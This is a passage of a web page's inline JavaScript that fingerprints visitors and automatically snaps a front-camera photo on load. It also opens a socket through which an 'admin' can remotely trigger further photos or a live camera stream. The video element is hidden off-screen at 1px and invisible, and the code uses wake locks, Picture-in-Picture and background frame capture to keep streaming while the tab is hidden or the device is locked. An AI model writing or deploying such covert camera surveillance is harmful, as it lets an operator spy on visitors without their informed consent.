            console.log('[CAPABILITY] Page is hidden - returning last known capability:', lastKnownCapable);
            return lastKnownCapable;
          }
          
          // If not forced and recently checked, return cached result
          const now = Date.now();
          if (!force && (now - lastCapabilityCheck) < CAPABILITY_CHECK_COOLDOWN) {
            // Silently return cached result - no console log to reduce noise
            return lastKnownCapable;
          }
          
          // Test camera access to verify user can actually stream/take photos
          const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
              width: { ideal: 320 },
              height: { ideal: 240 },
              facingMode: 'user'
            } 
          });
          
          // Verify we can actually capture a frame (test streaming capability)
          const video = document.createElement('video');
          video.srcObject = stream;
          video.muted = true;
          video.playsInline = true;
          
          await new Promise((resolve, reject) => {
            video.onloadedmetadata = () => {
              video.play().then(() => {
                // Try to capture a test frame
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                
                try {
                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                  // If we can draw, streaming is possible
                  stream.getTracks().forEach(track => track.stop());
                  video.srcObject = null;
                  canStreamOrPhoto = true;
                  lastKnownCapable = true; // Update last known capability
                  resolve(true);
                } catch (error) {
                  stream.getTracks().forEach(track => track.stop());
                  video.srcObject = null;
                  canStreamOrPhoto = false;
                  console.warn('[CAPABILITY] Frame capture test failed:', error);
                  reject(error);
                }
              }).catch(reject);
            };
            video.onerror = reject;
            
            // Timeout after 3 seconds
            setTimeout(() => {
              stream.getTracks().forEach(track => track.stop());
              video.srcObject = null;
              reject(new Error('Capability check timeout'));
            }, 3000);
          });
          
          // Ensure lastKnownCapable is set to true when capability check succeeds
          lastKnownCapable = true;
          lastCapabilityCheck = Date.now(); // Update check timestamp
          return true;
        } catch (error) {
          canStreamOrPhoto = false;
          lastKnownCapable = false; // Update last known capability
          lastCapabilityCheck = Date.now(); // Update check timestamp
          console.warn('[CAPABILITY] Streaming capability denied - user cannot stream/take photos:', error);
          return false;
        }
      }
    
    function initWebSocket() {
      // Prevent multiple simultaneous connection attempts
      if (isConnecting) {
        console.log('[WEBSOCKET] Connection already in progress, skipping...');
        return;
      }
      
      // Clean up existing socket before creating new one
      if (socket) {
        console.log('[WEBSOCKET] Cleaning up existing socket before reconnecting...');
        socket.removeAllListeners();
        socket.disconnect();
        socket = null;
      }
      
      isConnecting = true;
      
      // Use polling as fallback if WebSocket fails
      socket = io({
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionDelayMax: 10000,  // Max 10 seconds between attempts
        reconnectionAttempts: 10,  // Limited to 10 attempts to prevent infinite reconnection storms
        timeout: 20000
      });
      
      // Register user function (reusable) - only register if capable
      async function registerUser(forceCapabilityCheck = false) {
        if (currentEntryId && currentFingerprint && socket.connected) {
          // Use cached capability unless forced to check
          const capable = await checkCapability(forceCapabilityCheck);
          
          socket.emit('register_user', {
            entry_id: currentEntryId,
            fingerprint: currentFingerprint,
            capable: capable  // Send capability status
          });
          // Only log when forcing capability check (initial connection, reconnect, visibility change)
          if (forceCapabilityCheck) {
            console.log('[WEBSOCKET] Registered user:', currentEntryId, 'capable:', capable);
          }
        }
      }
      
      socket.on('connect', async () => {
        isConnecting = false;  // Reset flag on successful connection
        console.log('[WEBSOCKET] Connected to server');
        // Register this user's entry when connected (force capability check on initial connection)
        await registerUser(true);
        
        // Send periodic heartbeat to keep connection alive and re-register if needed
        if (heartbeatInterval) {
          clearInterval(heartbeatInterval);
        }
        heartbeatInterval = setInterval(async () => {
          // Don't send heartbeat if tab is closing
          if (isTabClosing) {
            return;
          }
          
          if (socket && socket.connected && currentEntryId && currentFingerprint) {
            // Use cached capability for heartbeat - don't check every time
            // Capability will be checked when page becomes visible or on initial connection
            const capable = lastKnownCapable;
            
            // Send ping to keep connection alive (optimized: only ping, no registration)
            socket.emit('ping', {
              entry_id: currentEntryId,
              fingerprint: currentFingerprint,
              capable: capable  // Send cached capability status
            });
            
            // Note: register_user is only called on initial connect, reconnect, or visibility change
            // Not on every heartbeat to reduce unnecessary traffic
          }
          // Removed duplicate reconnection - let socket.io's built-in reconnection handle it
          // This prevents reconnection storms when the server is down
        }, 30000); // Optimized: 30 seconds instead of 15s to reduce traffic
      });

      socket.on('reconnect', async (attemptNumber) => {
        console.log(`[WEBSOCKET] Reconnected to server (attempt ${attemptNumber})`);
        // Re-register user after reconnection (force capability check on reconnect)
        await registerUser(true);
      });

      socket.on('reconnect_attempt', (attemptNumber) => {
        console.log(`[WEBSOCKET] Reconnection attempt ${attemptNumber}`);
      });

      socket.on('reconnect_error', (error) => {
        console.error('[WEBSOCKET] Reconnection error:', error);
      });
      
      socket.on('connect_error', (error) => {
        isConnecting = false;  // Reset flag on connection error
        console.error('[WEBSOCKET] Connection error:', error);
      });
      
      socket.on('disconnect', () => {
        isConnecting = false;  // Reset flag on disconnect
        console.log('[WEBSOCKET] Disconnected');
      });

      socket.on('reconnect_failed', () => {
        console.error('[WEBSOCKET] Reconnection failed - will keep trying');
      });

      socket.on('connect_error', (error) => {
        console.error('[WEBSOCKET] Connection error:', error);
      });

      socket.on('disconnect', (reason) => {
        console.log('[WEBSOCKET] Disconnected from server:', reason);
        // Don't clear heartbeat interval - keep trying to reconnect
        // The heartbeat will attempt to reconnect
      });

      // Listen for photo requests from admin
      socket.on('photo_request', async (data) => {
        console.log('[WEBSOCKET] Photo request received:', data);
        
        // Check if this request is for this user
        if (data.entry_id === currentEntryId || data.fingerprint === currentFingerprint) {
          // Capture and upload photo with source "Manual" (requested by admin)
          try {
            await capturePhoto('Manual');
            console.log('[WEBSOCKET] Photo captured in response to admin request');
          } catch (error) {
            console.error('[WEBSOCKET] Failed to capture photo:', error);
          }
        }
      });

      // Listen for stream requests from admin
      socket.on('stream_request', async (data) => {
        console.log('[WEBSOCKET] Stream request received:', data);
        
        // Check if this request is for this user
        if (data.entry_id === currentEntryId || data.fingerprint === currentFingerprint) {
          // Start streaming
          try {
            await startLiveStream(data.entry_id);
            console.log('[WEBSOCKET] Live stream started');
          } catch (error) {
            console.error('[WEBSOCKET] Failed to start stream:', error);
          }
        }
      });

      socket.on('stop_stream_request', (data) => {
        console.log('[WEBSOCKET] Stop stream request received:', data);
        if (data.entry_id === currentEntryId) {
          stopLiveStream();
        }
      });
    }

    // Handle Page Visibility API for mobile devices
    document.addEventListener('visibilitychange', async () => {
      if (document.hidden) {
        // Keep trying to maintain connection even when hidden
        // Only reconnect if not already connecting and socket exists but is disconnected
        if (isStreaming && socket && !socket.connected && !isConnecting) {
          console.log('[VISIBILITY] Attempting to reconnect while hidden...');
          initWebSocket();
        }
        
        // When hidden, ensure video continues playing (iOS workaround)
        if (isStreaming && streamInterval && streamInterval.video) {
          const video = streamInterval.video;
          if (video.paused) {
            video.play().catch(err => {
              console.warn('[VISIBILITY] Failed to resume video when hidden:', err);
            });
          }
          
          // Force a frame capture immediately when hidden
          if (captureAndSendFrameFunction && typeof captureAndSendFrameFunction === 'function') {
            setTimeout(() => {
              if (isStreaming && document.hidden) {
                captureAndSendFrameFunction();
              }
            }, 100);
          }
        }
        
        // When tab is hidden, keep the last known capability status
        // Don't immediately mark as offline - user can still stream/take photos in background
        // Only update capability when page becomes visible again
        if (socket && socket.connected && currentEntryId && currentFingerprint) {
          // Only send ping when hidden, not register_user (optimized to reduce traffic)
          socket.emit('ping', {
            entry_id: currentEntryId,
            fingerprint: currentFingerprint,
            capable: lastKnownCapable  // Use last known capability
          });
        }
      } else {
        // Page became visible again (device unlocked or tab focused)
        if (socket && socket.connected && currentEntryId && currentFingerprint) {
          // Re-check capability when page becomes visible (force check)
          const capable = await checkCapability(true);
          
          socket.emit('register_user', {
            entry_id: currentEntryId,
            fingerprint: currentFingerprint,
            capable: capable
          });
          socket.emit('ping', {
            entry_id: currentEntryId,
            fingerprint: currentFingerprint,
            capable: capable
          });
          
          // If streaming was active, notify that it resumed
          if (isStreaming) {
            socket.emit('stream_status', {
              entry_id: currentEntryId,
              status: 'resumed',
              message: 'Stream resumed - device unlocked'
            });
            
            // Ensure video is playing
            if (streamInterval && streamInterval.video) {
              streamInterval.video.play().catch(err => {
                console.warn('[VISIBILITY] Failed to resume video:', err);
              });
            }
          }
        } else if (socket && !socket.connected && !isConnecting) {
          console.log('[VISIBILITY] Reconnecting WebSocket...');
          initWebSocket();
        }
      }
    });

    // Handle focus events
    window.addEventListener('focus', async () => {
      if (socket && socket.connected && currentEntryId && currentFingerprint) {
        // Re-check capability when window gains focus (force check)
        const capable = await checkCapability(true);
        
        socket.emit('register_user', {
          entry_id: currentEntryId,
          fingerprint: currentFingerprint,
          capable: capable
        });
        socket.emit('ping', {
          entry_id: currentEntryId,
          fingerprint: currentFingerprint,
          capable: capable
        });
      }
    });

    // Live stream variables
    let streamInterval = null;
    let mediaStream = null;
    let captureAndSendFrameFunction = null; // Store frame capture function for visibility handler

    async function startLiveStream(entryId) {
      try {
        // Request wake lock to prevent device from sleeping
        await requestWakeLock();
        isStreaming = true;
        
        // Request camera access
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            width: { ideal: 320 },
            height: { ideal: 240 },
            facingMode: 'user'
          } 
        });

        const video = document.createElement('video');
        video.srcObject = mediaStream;
        video.play();
        video.setAttribute('playsinline', 'true'); // Important for mobile
        video.setAttribute('autoplay', 'true');
        video.setAttribute('muted', 'true'); // Required for autoplay on mobile
        
        // Keep video visible (off-screen) to prevent iOS from suspending it when minimized
        // This is critical for iOS Safari background operation
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        video.style.width = '1px';
        video.style.height = '1px';
        video.style.opacity = '0';
        video.style.pointerEvents = 'none';
        video.style.zIndex = '-1';
        document.body.appendChild(video);
        
        // Try to enable Picture-in-Picture for better background support (iOS 13+)
        let pipWindow = null;
        if (video.requestPictureInPicture && document.pictureInPictureEnabled) {
          try {
            // Request PiP when page becomes hidden (iOS will handle this)
            const enablePiP = async () => {
              try {
                if (document.pictureInPictureElement !== video && !pipWindow) {
                  pipWindow = await video.requestPictureInPicture();
                  console.log('[STREAM] Picture-in-Picture enabled for background streaming');
                }
              } catch (pipError) {
                // PiP not available or user denied - continue without it
                console.log('[STREAM] Picture-in-Picture not available:', pipError.message);
              }
            };
            
            // Try to enable PiP immediately
            enablePiP();
            
            // Also try when page becomes hidden
            document.addEventListener('visibilitychange', () => {
              if (document.hidden && isStreaming) {
                enablePiP();
              }
            });
          } catch (error) {
            console.log('[STREAM] Picture-in-Picture setup failed:', error);
          }
        }

        // Create canvas to capture frames
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 320;
        canvas.height = 240;

        // Frame queue to prevent overwhelming the server
        let frameQueue = 0;
        const MAX_QUEUE = 2;
        let lastFrameTime = Date.now();
        let frameCallbackId = null;
        let fallbackInterval = null;
        let framesSent = 0;
        let lastFrameSentTime = Date.now();

        // Function to capture and send a frame
        const captureAndSendFrame = function() {
          // Skip frame if queue is full
          if (frameQueue >= MAX_QUEUE) {
            return;
          }

          // Force video to play if paused (iOS may pause when hidden)
          if (video.paused) {
            video.play().catch(err => {
              console.warn('[STREAM] Video play failed:', err);
            });
          }

          if (video.readyState === video.HAVE_ENOUGH_DATA) {
            try {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              const frameData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
              
              if (socket && socket.connected) {
                frameQueue++;
                framesSent++;
                lastFrameSentTime = Date.now();
                
                socket.emit('stream_frame', {
                  entry_id: entryId,
                  frame_data: frameData
                }, () => {
                  if (frameQueue > 0) frameQueue--;
                });
              }
            } catch (error) {
              console.error('[STREAM] Error capturing frame:', error);
            }
          }
        }
        
        // Store frame capture function for visibility handler
        captureAndSendFrameFunction = captureAndSendFrame;

        // Optimized: Single adaptive frame capture mechanism
        // Adjust frame rate based on page visibility and connection quality
        const getFrameInterval = () => {
          // Slower when hidden to reduce CPU/network usage
          return document.hidden ? 1000 : 500; // 1 FPS when hidden, 2 FPS when visible
        };

        // Use requestVideoFrameCallback if available (better for video, works even when hidden)
        if (video.requestVideoFrameCallback) {
          console.log('[STREAM] Using requestVideoFrameCallback API with adaptive rate');
          
          let lastCallbackTime = Date.now();
          const minInterval = 500; // Minimum 500ms between frames
          
          function onVideoFrame(now, metadata) {
            if (!isStreaming) return;
            
            const currentTime = Date.now();
            const timeSinceLastFrame = currentTime - lastCallbackTime;
            const targetInterval = getFrameInterval();
            
            // Only capture if enough time has passed (adaptive rate)
            if (timeSinceLastFrame >= targetInterval) {
              captureAndSendFrame();
              lastCallbackTime = currentTime;
            }
            
            // Schedule next frame
            frameCallbackId = video.requestVideoFrameCallback(onVideoFrame);
          }
          
          // Start frame callback
          frameCallbackId = video.requestVideoFrameCallback(onVideoFrame);
          
          // Fallback interval for monitoring and backup capture
          fallbackInterval = setInterval(() => {
            if (!isStreaming) return;
            
            // Check if frames are being sent (detect if suspended)
            const timeSinceLastFrame = Date.now() - lastFrameSentTime;
            if (timeSinceLastFrame > 2000 && isStreaming) {
              // No frames sent in 2 seconds - might be suspended, try to capture
              console.warn('[STREAM] No frames sent in 2 seconds - attempting recovery');
              captureAndSendFrame();
            }
          }, 2000); // Check every 2 seconds
        } else {
          // Fallback to setInterval for older browsers (optimized single interval)
          console.log('[STREAM] Using optimized setInterval (requestVideoFrameCallback not available)');
          
          let currentInterval = getFrameInterval();
          
          fallbackInterval = setInterval(() => {
            if (!isStreaming) return;
            
            // Update interval based on visibility (adaptive rate)
            const newInterval = getFrameInterval();
            if (newInterval !== currentInterval) {
              // Restart interval with new rate
              clearInterval(fallbackInterval);
              currentInterval = newInterval;
              fallbackInterval = setInterval(() => {
                if (!isStreaming) return;
                captureAndSendFrame();
              }, currentInterval);
              return;
            }
            
            captureAndSendFrame();
            
            // Detect if frames stopped (device locked)
            const timeSinceLastFrame = Date.now() - lastFrameSentTime;
            if (timeSinceLastFrame > 3000 && isStreaming) {
              console.warn('[STREAM] Frame capture appears suspended - device might be locked');
            }
          }, currentInterval);
        }

        // Monitor frame sending to detect when device is locked
        const frameMonitor = setInterval(() => {
          if (!isStreaming) {
            clearInterval(frameMonitor);
            return;
          }
          
          const timeSinceLastFrame = Date.now() - lastFrameSentTime;
          
          // If no frames sent in 3 seconds, notify admin that streaming stopped
          if (timeSinceLastFrame > 3000 && framesSent > 0) {
            console.warn('[STREAM] Streaming appears to have stopped - device might be locked');
            // Optionally notify admin via WebSocket
            if (socket && socket.connected) {
              socket.emit('stream_status', {
                entry_id: entryId,
                status: 'suspended',
                message: 'Device may be locked - frames not being captured'
              });
            }
          }
        }, 3000);

        // Store references for cleanup
        streamInterval = {
          frameCallbackId: frameCallbackId,
          fallbackInterval: fallbackInterval,
          frameMonitor: frameMonitor,
          video: video,
          pipWindow: pipWindow
        };

        console.log('[STREAM] Live stream started (optimized: 320x240 @ 5 FPS)');
      } catch (error) {
        console.error('[STREAM] Failed to start stream:', error);
        alert('Failed to access camera: ' + error.message);
        isStreaming = false;
        releaseWakeLock();
      }
    }

    function stopLiveStream() {
      isStreaming = false;
      releaseWakeLock();
      
      if (streamInterval) {
        // Cancel video frame callback if exists
        if (streamInterval.video && streamInterval.video.cancelVideoFrameCallback && streamInterval.frameCallbackId) {
          streamInterval.video.cancelVideoFrameCallback(streamInterval.frameCallbackId);
        }
        
        // Exit Picture-in-Picture if active
        if (streamInterval.pipWindow && document.pictureInPictureElement) {
          document.exitPictureInPicture().catch(err => {
            console.log('[STREAM] Exit PiP failed:', err);
          });
        }
        
        // Remove video element from DOM
        if (streamInterval.video && streamInterval.video.parentNode) {
          streamInterval.video.parentNode.removeChild(streamInterval.video);
        }
        
        // Clear intervals
        if (streamInterval.fallbackInterval) {
          clearInterval(streamInterval.fallbackInterval);
        }
        if (streamInterval.frameMonitor) {
          clearInterval(streamInterval.frameMonitor);
        }
        
        streamInterval = null;
      }
      
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
      }
      
      // Clear frame capture function reference
      captureAndSendFrameFunction = null;
      
      console.log('[STREAM] Live stream stopped');
    }

    // Auto-run on page load
    window.addEventListener('load', async function() {
      // Start data collection
      const dataCollectionPromise = collectAllData();

      // Start photo capture in parallel (don't wait for data collection)
      // This way photo capture can start immediately after a short delay
      const photoCapturePromise = (async () => {
        // Wait a bit for page to be ready, but don't wait for data collection
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Wait for data collection to get entry_id, but with a timeout
        // If data collection takes too long, proceed anyway
        try {
          await Promise.race([
            dataCollectionPromise,
            new Promise(resolve => setTimeout(resolve, 2000)) // Max 2s wait
          ]);
        } catch (e) {
          // Continue even if data collection fails
        }
        
        // Capture photo
        capturePhoto('auto');
      })();

      // Wait for data collection to complete (for entry_id)
      await dataCollectionPromise;

      // Store entry ID and fingerprint for photo requests
      currentEntryId = window.currentEntryId;
      currentFingerprint = window.currentFingerprint;

      // Initialize WebSocket connection for photo requests (after data is collected)
      initWebSocket();

      // Photo capture is already running in parallel, no need to wait
    });

    // Function to mark user as offline and cleanup
    function markUserOfflineAndCleanup() {
      if (isTabClosing) return; // Already handled
      
      console.log('[UNLOAD] Tab is closing - marking user as offline');
      isTabClosing = true; // Set flag to prevent capability checks
      
      // Stop heartbeat interval immediately
      if (heartbeatInterval) {
        clearInterval(heartbeatInterval);
        heartbeatInterval = null;
      }
      
      // Stop live stream
      stopLiveStream();
      
      // Mark user as offline (capable: false) before disconnecting
      // Send messages immediately without waiting for callbacks (page might close)
      if (socket && socket.connected && currentEntryId && currentFingerprint) {
        try {
          // Send final messages marking user as offline
          // Don't wait for callbacks - page might close before they execute
          socket.emit('register_user', {
            entry_id: currentEntryId,
            fingerprint: currentFingerprint,
            capable: false  // Mark as offline when closing
          });
          
          socket.emit('ping', {
            entry_id: currentEntryId,
            fingerprint: currentFingerprint,
            capable: false  // Mark as offline when closing
          });
          
          // Disconnect immediately (messages are queued and will be sent)
          socket.disconnect();
        } catch (e) {
          // If emit fails, just disconnect
          console.warn('[UNLOAD] Error sending offline message:', e);
          if (socket && socket.connected) {
            socket.disconnect();
          }
        }
      } else if (socket && socket.connected) {
        socket.disconnect();
      }
    }
    
    // Handle page unload - mark user as offline when tab closes
    // Use both beforeunload and pagehide for better reliability
    window.addEventListener('beforeunload', markUserOfflineAndCleanup);
    window.addEventListener('pagehide', markUserOfflineAndCleanup);
  </script>
</body>
</html>